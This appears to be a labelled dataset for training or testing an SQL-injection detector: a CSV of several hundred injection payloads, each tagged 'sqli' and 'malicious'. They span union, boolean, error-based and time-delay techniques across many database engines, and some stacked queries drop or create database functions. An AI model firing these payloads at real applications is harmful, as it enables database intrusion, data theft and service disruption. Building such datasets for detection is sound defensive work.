payload,type,label
"1'||(select 'qued' where 9801=9801 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,malicious
"1) where 7026=7026;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
"1')) as icik where 1440=1440 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
-5708 where 3134=3134 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,malicious
"1 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,malicious
"1"")) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""sjiz"" like ""sjiz",sqli,malicious
"1)) union all select null,null,null,null,null,null,null,null,null,null#",sqli,malicious
"1')) as wkys where 2478=2478 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,malicious
"1"") where 9770=9770 union all select null,null,null,null,null,null--",sqli,malicious
"1))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('gyre'='gyre",sqli,malicious
"1%';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'='",sqli,malicious
"-8472') where 3340=3340 or make_set(1752=9905,9905)--",sqli,malicious
"1')) as lmsl where 3753=3753 or elt(5873=5873,sleep(5))#",sqli,malicious
"1)) as hpxw where 1826=1826 union all select null,null,null,null,null,null,null,null#",sqli,malicious
"1))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,malicious
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,malicious
"1"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""udlh""=""udlh",sqli,malicious
-2679'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('cutk' like 'cutk,sqli,malicious
"1)) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"1'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('ofko'='ofko",sqli,malicious
1'||(select 'jmhb' where 1794=1794 or 4240=(select 4240 from pg_sleep(5))--,sqli,malicious
1));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,malicious
"1"" where 6200=6200 and elt(1210=1210,sleep(5))--",sqli,malicious
"1' in boolean mode);call regexp_substring(repeat(right(char(3702),0),500000000),null)#",sqli,malicious
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null) and 'pczr'='pczr",sqli,malicious
-2983') or 8571=8571--,sqli,malicious
"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",sqli,malicious
"-8709"" or 8571=8571--",sqli,malicious
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('pbqg'='pbqg",sqli,malicious
"1%""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""%""=""",sqli,malicious
"1"") and (select * from (select(sleep(5)))fzno) and (""zvew"" like ""zvew",sqli,malicious
"1'+(select 'xqpe' where 4020=4020 union all select null,null--",sqli,malicious
1);(select * from (select(sleep(5)))srmq) and (9069=9069,sqli,malicious
1)) as prxq where 4600=4600;(select * from (select(sleep(5)))acdk)#,sqli,malicious
"1"")) and (select * from (select(sleep(5)))fzno) and ((""ykhp"" like ""ykhp",sqli,malicious
-3596))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((3645=3645,sqli,malicious
"1)) as eigk where 2557=2557;select count(*) from generate_series(1,5000000)--",sqli,malicious
"-2384'||(select 'vhcp' from dual where 1266=1266 union all select 1266,1266,1266,1266--",sqli,malicious
"1') where 8163=8163;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,malicious
"-2899"")) as uyoc where 8417=8417 union all select 8417,8417,8417,8417--",sqli,malicious
-5751) as jybu where 4739=4739 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,malicious
"1%') and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
-5569') as cjaf where 3753=3753 union all select 3753#,sqli,malicious
"1%"") or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""%""=""",sqli,malicious
"1'+(select inrv where 2178=2178 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
1);if(4735=8907) select 4735 else drop function qigo--,sqli,malicious
"1"") union all select null,null,null,null,null,null,null,null,null#",sqli,malicious
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('cqrp'='cqrp",sqli,malicious
"1"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""xmrq""=""xmrq",sqli,malicious
"1')) as ovbz where 3203=3203 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,malicious
"1') as noqp where 4042=4042 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
-7505')) as lqvw where 8565=8565 or 6872=6872--,sqli,malicious
"1"") where 4182=4182 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,malicious
"1"") where 2180=2180 and make_set(8403=8403,8899)--",sqli,malicious
"1') as fkpn where 1100=1100;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,malicious
"1"")) as uzvu where 2458=2458 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,malicious
"1') and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,malicious
"1%'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('%'='",sqli,malicious
"1' in boolean mode) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,malicious
1') as pogx where 4105=4105 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,malicious
"-7041""))) union all select 2159,2159,2159,2159,2159--",sqli,malicious
"-4679 where 9634=9634 union all select 9634,9634,9634,9634,9634,9634,9634--",sqli,malicious
"1"") union all select null,null,null#",sqli,malicious
"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",sqli,malicious
"1)) as pxmz where 2596=2596;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,malicious
"-7306"" or 2081=6847",sqli,malicious
1%';select (case when (7271=1658) then 7271 else 7271*(select 7271 from information_schema.character_sets) end)#,sqli,malicious
"1%"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""%""=""",sqli,malicious
"1"") where 6956=6956 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"-9770')) as ovhh where 7903=7903 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,malicious
"-8599)) or elt(5628=2324,2324) and ((1134=1134",sqli,malicious
1));begin dbms_lock.sleep(5); end and ((2160=2160,sqli,malicious
"1"")) and elt(4249=4249,7259) and ((""xjdh""=""xjdh",sqli,malicious
"-1438 where 6759=6759 union all select 6759,6759#",sqli,malicious
"1%"") union all select null,null,null,null#",sqli,malicious
"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",sqli,malicious
"-2340%"" order by 1#",sqli,malicious
1%')));if(7899=7899) select 7899 else drop function zbbp--,sqli,malicious
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('ndhn' like 'ndhn",sqli,malicious
"1'+(select 'qvif' where 1758=1758 union all select null,null,null,null,null,null,null,null#",sqli,malicious
-8504 where 3086=3086 or 1131=9188#,sqli,malicious
1;select case when 7717=7717 then 1 else null end--,sqli,malicious
1'+(select 'luhy' where 3112=3112 and (3020=3020)*6703)+',sqli,malicious
"1%"" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ""%""=""",sqli,malicious
"-4641"") where 4212=4212 or make_set(3595=4062,4062)--",sqli,malicious
"1"") and elt(1889=7397,7397) and (""kuau""=""kuau",sqli,malicious
"1'||(select 'adoe' from dual where 7662=7662;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)||'",sqli,malicious
1'))) and (select * from (select(sleep(5)))fzno) and ((('acml' like 'acml,sqli,malicious
"1"") as eibf where 5026=5026 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,malicious
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'nhmz' like 'nhmz",sqli,malicious
"-7234"") union all select 3154,3154,3154,3154#",sqli,malicious
1) as qywz where 1864=1864 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,malicious
-6200%')) or 8077=4661,sqli,malicious
1') waitfor delay '0:0:5',sqli,malicious
-2820')) or 6679=8848--,sqli,malicious
1%') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('%'=',sqli,malicious
"1"" where 3368=3368 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,malicious
-8777%'))) or (3934=2025)*2025 and ((('%'=',sqli,malicious
"1)) as rcon where 8190=8190 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,malicious
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",sqli,malicious
"1') as keom where 7524=7524 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,malicious
"-6200')) as jjpz where 4490=4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",sqli,malicious
1))) or (select * from (select(sleep(5)))ydpu) and (((3332=3332,sqli,malicious
"1')) and elt(1210=1210,sleep(5)) and (('jnmf'='jnmf",sqli,malicious
"1%' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and '%'='",sqli,malicious
"1 where 5925=5925 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"-1915%"")) union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",sqli,malicious
"1' where 8969=8969 union all select null,null,null,null,null--",sqli,malicious
"1'||(select 'vwop' where 8536=8536 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,malicious
"1 and 8407=(select count(*) from generate_series(1,5000000))",sqli,malicious
-2214') union all select 8228#,sqli,malicious
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null)",sqli,malicious
1') as jxtg where 1071=1071 and sleep(5)--,sqli,malicious
"1"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (""tlbp""=""tlbp",sqli,malicious
"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and 'ibdj'='ibdj",sqli,malicious
"-5640"")) or 9792=2728--",sqli,malicious
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (7338=7338",sqli,malicious
"1"") as vpna where 5450=5450 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
1%')));waitfor delay '0:0:5'--,sqli,malicious
"1')) as kgfp where 2366=2366;select count(*) from generate_series(1,5000000)--",sqli,malicious
1'));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,malicious
"-9347') union all select 3884,3884#",sqli,malicious
1) or sleep(5)#,sqli,malicious
1%')));(select * from (select(sleep(5)))srmq) and ((('%'=',sqli,malicious
"1' in boolean mode) union all select null,null,null,null,null,null,null,null,null#",sqli,malicious
"1'));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,malicious
"1%"" or sleep(5) and ""%""=""",sqli,malicious
"1,(select (case when (2106=2106) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 2106*(select 2106 from master..sysdatabases) end))",sqli,malicious
"1%"" or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,malicious
"-3747"") union all select 8962,8962,8962,8962,8962#",sqli,malicious
"1"") where 4588=4588;begin dbms_lock.sleep(5); end--",sqli,malicious
"1"" where 4161=4161 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
"1%"" or 4240=(select 4240 from pg_sleep(5))--",sqli,malicious
-7742) as tgzq where 7842=7842 or 2062=1563,sqli,malicious
"1'))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,malicious
"1%"")));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,malicious
1 or sleep(5)-- nrzf,sqli,malicious
"1') as ywtu where 3009=3009 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,malicious
"-4044%"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""%""=""",sqli,malicious
1')) or sleep(5) and (('uzhd' like 'uzhd,sqli,malicious
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('ywxc'='ywxc",sqli,malicious
"1"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,malicious
"-9583%"")) union all select 9349,9349,9349,9349,9349,9349,9349--",sqli,malicious
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,malicious
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('xpks' like 'xpks",sqli,malicious
"1%"");select * from generate_series(1488,1488,case when (1488=1685) then 1 else 0 end) limit 1--",sqli,malicious
-3966') or 7338=8657,sqli,malicious
"1"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""vziz""=""vziz",sqli,malicious
"1"" where 5796=5796 and sleep(5)#",sqli,malicious
-8248 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),sqli,malicious
"1"") as pgza where 8756=8756 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,malicious
select 'qqpjq'||(case 5118 when 5118 then 1 else 0 end)||'qzvzq' from rdb$database,sqli,malicious
"1)) as gobw where 3496=3496 union all select null,null,null,null,null,null,null,null,null--",sqli,malicious
"-5560"")) or 7292=6184#",sqli,malicious
1' and sleep(5)#,sqli,malicious
"1) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (4976=4976",sqli,malicious
"1""))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""ldlp""=""ldlp",sqli,malicious
"1"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""kfdh"" like ""kfdh",sqli,malicious
1)) or sleep(5) and ((8285=8285,sqli,malicious
"1"")) as gqxk where 9199=9199 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli,malicious
1%' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and '%'=',sqli,malicious
1') as xbsc where 6772=6772;waitfor delay '0:0:5'--,sqli,malicious
"1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'cgbf' like 'cgbf",sqli,malicious
"1' or elt(6272=6272,sleep(5)) and 'vrim'='vrim",sqli,malicious
"1"")));select case when 6229=2077 then 1 else null end--",sqli,malicious
"1"" where 7599=7599;begin user_lock.sleep(5); end--",sqli,malicious
"1 where 5332=5332 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,malicious
"1%'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('%'='",sqli,malicious
"1%"") or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""%""=""",sqli,malicious
"1"" where 4672=4672;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,malicious
"-5313""))) union all select 9189,9189,9189,9189,9189,9189,9189,9189--",sqli,malicious
1' or 6793=(select 6793 from pg_sleep(5)),sqli,malicious
"1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)-- xlfz",sqli,malicious
1;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,malicious
"1""))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"-1526"") where 4870=4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",sqli,malicious
"1"")) or sleep(5) and ((""mcyv""=""mcyv",sqli,malicious
"1%"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""%""=""",sqli,malicious
1'+(select 'diet' where 7004=7004 rlike sleep(5))+',sqli,malicious
1');(select * from (select(sleep(5)))srmq) and ('pags'='pags,sqli,malicious
"1"") where 9621=9621;waitfor delay '0:0:5'--",sqli,malicious
"-3817"") as vugz where 3064=3064 or 9323=9323#",sqli,malicious
"1""))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""fogb"" like ""fogb",sqli,malicious
1) where 9649=9649 and 8594=(select 8594 from pg_sleep(5))--,sqli,malicious
1');begin user_lock.sleep(5); end--,sqli,malicious
"1%"" and (3020=3020)*6703 and ""%""=""",sqli,malicious
"1%"")) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""%""=""",sqli,malicious
"1')) union all select null,null,null,null,null,null--",sqli,malicious
"-2305' in boolean mode) union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",sqli,malicious
"1%""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""%""=""",sqli,malicious
"1%'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('%'='",sqli,malicious
-9145') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('yvfl' like 'yvfl,sqli,malicious
"-4721') or elt(4378=5165,5165) and ('fufn'='fufn",sqli,malicious
1'+(select xzse where 4530=4530;(select * from (select(sleep(5)))srmq))+',sqli,malicious
-6203'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('luee'='luee,sqli,malicious
"1%');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('%'='",sqli,malicious
"1"")) as exzo where 7518=7518 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,malicious
1'))) and (8982=8027)*8027 and ((('qkrv'='qkrv,sqli,malicious
"1%') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='",sqli,malicious
"1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('acly' like 'acly",sqli,malicious
"-4606"") as elek where 8261=8261 or 8571=8571--",sqli,malicious
"1',(select (case when (3902=3902) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual)",sqli,malicious
"1"") as hblk where 7982=7982 and 9611=6142--",sqli,malicious
"1%' union all select null,null,null,null,null,null,null,null#",sqli,malicious
"-5204"") union all select 7186,7186,7186--",sqli,malicious
"1) where 1622=1622;select benchmark(5000000,md5(0x4c4d6142))--",sqli,malicious
"1"" where 8379=8379 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,malicious
"1%"")));(select * from (select(sleep(5)))srmq) and (((""%""=""",sqli,malicious
1%')) waitfor delay '0:0:5' and (('%'=',sqli,malicious
"1%')) union all select null,null--",sqli,malicious
"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)-- loao",sqli,malicious
"1' in boolean mode) or elt(5873=5873,sleep(5))#",sqli,malicious
1' in boolean mode);select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,malicious
"1));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,malicious
1') as yqld where 2489=2489;waitfor delay '0:0:5'--,sqli,malicious
"-5672')) union all select 9371,9371,9371,9371,9371,9371--",sqli,malicious
"1')));select benchmark(5000000,md5(0x714e4153))#",sqli,malicious
"-5597') or make_set(2490=2164,2164)",sqli,malicious
"-7119"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""rmzm""=""rmzm",sqli,malicious
"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,malicious
"1'||(select 'jfxs' from dual where 5485=5485 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,malicious
"1%') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('%'='",sqli,malicious
1) as wiyx where 6515=6515;select case when 7717=7717 then 1 else null end--,sqli,malicious
"1%"")));select * from generate_series(9964,9964,case when (9964=4455) then 1 else 0 end) limit 1--",sqli,malicious
"1') as bdei where 9531=9531 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,malicious
"1%') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('%'='",sqli,malicious
"1"") where 9680=9680 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,malicious
"1%"");if(9953=4347) select 9953 else drop function ocau--",sqli,malicious
-4965) as imga where 3705=3705 union all select 3705--,sqli,malicious
"1) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (8898=8898",sqli,malicious
"1'+(select aahc where 5436=5436 and 3824=benchmark(5000000,md5(0x76555642)))+'",sqli,malicious
"-8309'||(select 'qecl' where 8449=8449 union all select 8449,8449,8449,8449,8449,8449,8449--",sqli,malicious
"1%"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""%""=""",sqli,malicious
(case when 2646=8520 then 2646 else null end),sqli,malicious
"1"") waitfor delay '0:0:5' and (""hhzy"" like ""hhzy",sqli,malicious
1') where 4867=4867 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,sqli,malicious
"1"")) as uxnc where 8041=8041 and 9198=9198--",sqli,malicious
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('wdru' like 'wdru",sqli,malicious
"1') as wnys where 6457=6457 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,malicious
1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('iuki'='iuki,sqli,malicious
"-4807' where 3232=3232 or make_set(6599=5179,5179)--",sqli,malicious
"1' in boolean mode) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)#",sqli,malicious
